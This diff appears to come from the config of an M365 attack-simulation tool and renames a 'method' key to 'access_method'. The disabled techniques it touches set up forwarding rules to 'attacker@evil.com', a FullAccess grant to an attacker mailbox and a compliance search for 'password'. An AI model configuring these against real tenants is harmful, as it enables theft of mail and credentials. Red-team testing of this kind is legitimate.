@@ -16,7 +16,7 @@ techniques:
     enabled: False
     parameters:
       auth_method : resource_owner
-      method: "graph"
+      access_method: "graph"
       mailbox: "victim@victim.com"
       limit : 5
 
@@ -24,7 +24,7 @@ techniques:
     enabled: False
     parameters:
       auth_method : resource_owner
-      method: "graph"
+      access_method: "graph"
       mailbox: "victim@victim.com"
       rule_name : "msinvader rule 33" 
       forward_to : "attacker@evil.com"
@@ -34,7 +34,7 @@ techniques:
     enabled: False
     parameters:
       auth_method : resource_owner
-      method : "rest"
+      access_method: "rest"
       mailbox: "victim@victim.com"
       forward_to : "attacker@evil.com"
                 
@@ -42,7 +42,7 @@ techniques:
     enabled: False
     parameters:
       auth_method : resource_owner
-      method : "rest"
+      access_method: "rest"
       mailbox : "victim@victim.com"
       folder: "Inbox"
       grantee : "Default"
@@ -52,7 +52,7 @@ techniques:
     enabled: False
     parameters:
       auth_method : resource_owner
-      method : "rest"
+      access_method: "rest"
       mailbox: "victim@victim.com"
       grantee : "attacker@victim.com"
       access_rights : "FullAccess"
@@ -61,7 +61,7 @@ techniques:
     enabled: False
     parameters:
       auth_method : resource_owner
-      method : "rest"
+      access_method: "rest"
       keyword : "password"
       name : "msInvader 365 compliance search"
                                   
@@ -69,6 +69,6 @@ techniques:
     enabled: False
     parameters:
       auth_method : resource_owner
-      method : "rest"
+      access_method: "rest"
       forward_to : "attacker@evil.com"
       name : "msInvader mailfow rule"
